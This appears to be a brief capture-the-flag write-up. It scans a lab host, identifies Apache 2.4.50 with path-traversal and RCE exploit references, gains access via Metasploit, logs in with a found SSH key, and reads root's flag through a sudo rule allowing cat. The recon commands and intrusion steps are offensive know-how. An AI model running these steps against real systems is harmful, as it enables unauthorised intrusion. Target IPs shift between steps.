## Recon

```sh
└─# rustscan  --range 1-65535 -a $ip --ulimit 5000 -- -sV
└─# nmap -sV -Pn -p1-65535 --min-rate 3000 172.31.73.177
Host is up (8.0s latency).
Not shown: 59379 filtered tcp ports (no-response), 6155 closed tcp ports (reset)
PORT   STATE SERVICE    VERSION
22/tcp open  tcpwrapped
Not shown: 64595 filtered tcp ports (no-response), 939 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

- http://172.31.78.183:8081/


```sh
└─# ffuf -u 'http://172.31.78.183:8081/cgi-bin/FUZZ' -w /usr/share/wordlists/dirb/common.txt -e cgi

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://172.31.78.183:8081/cgi-bin/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : cgi 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 754ms]
.htpasswd               [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 978ms]
.htacgi                 [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 1061ms]
.htpasswdcgi            [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 1245ms]
.hta                    [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 1245ms]
.htaccess               [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 1384ms]
.htaccesscgi            [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 1384ms]
printenv                [Status: 500, Size: 528, Words: 59, Lines: 15, Duration: 1457ms]
test-cgi                [Status: 500, Size: 528, Words: 59, Lines: 15, Duration: 2706ms]

```


Return to my nmap

```sh
Nmap scan report for 172.31.68.39
Host is up (0.23s latency).

PORT     STATE SERVICE VERSION
8081/tcp open  http    Apache httpd 2.4.50 ((Unix))

Apache HTTP Server 2.4.50 - Path Traversal & Remote Code Execution (RCE)                                                   | multiple/webapps/50406.sh
Apache HTTP Server 2.4.50 - Remote Code Execution (RCE) (2)                                                                | multiple/webapps/50446.sh
Apache HTTP Server 2.4.50 - Remote Code Execution (RCE) (3)                                                                | multiple/webapps/50512.py

```


pwned using metasploit
found `id_rsa` on /usr/local/apache2

```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4CO0DmIKL6Fruh0Y+oSW/so5j/w/EDCe7t6asQvlXZI7Q+5SJZZQw11ya8xUfe55+bYJgQYjWkXR66NekrP1IjywSW7oIUiHmrtkInpfaUxyPL2A8UNyuKapS1VUuHQADGySc88OF50P8gL541jOTLDh4pvANCW24M1NGcsCDw4dIp2pEIxfbrt71EzXCxK++HEMbVjnfw1vCVi/Hl3qB9ftoM2mWt/fWo7NjHi/UugfbMvTtJtyo1L4cEYMYLdhtYm9LJkI6AhAwcTNj3NxHbKbdIthA2hWQe5BsIdUAyh4VtXScgqxa50icqiuIbrMGq4xrBrNZNO3OXo9VQ7EAgQAi2BcI9uhLzPgCNJ8QXpvp6Z/f7dtjWYlGnIC2t8rYoa+Etg44XcifFagIGj7O+fRY1kkR/8D5hxxavJ6X8wWOj6l9dnz2GKd6xGvs/Dm6hjDsSsT96w3Rkc5pIuofKNx2808EGnU2K8jj06Q3hbDbqpGM7ti9kMCCQhogQS0= machine@machine

# ssh machine@172.31.65.248 -i id_rsa                                    
The authenticity of host '172.31.65.248 (172.31.65.248)' can't be established.
ED25519 key fingerprint is SHA256:S5ysyxlhLXp/wdsnNjau5Fjy9nsuf2hca/lBq8wX65M.
This key is not known by any other names.
FlagY{1922630a2801902cca315e67f55d8890}
```

## Root

```
machine@machine:~$ sudo -l
Matching Defaults entries for machine on machine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User machine may run the following commands on machine:
    (ALL) NOPASSWD: /bin/cat *

root@machine:~# cat root.txt 
FlagY{68ee3e5e2fffb1c62f70976814b57b3b}
root@machine:~# 

```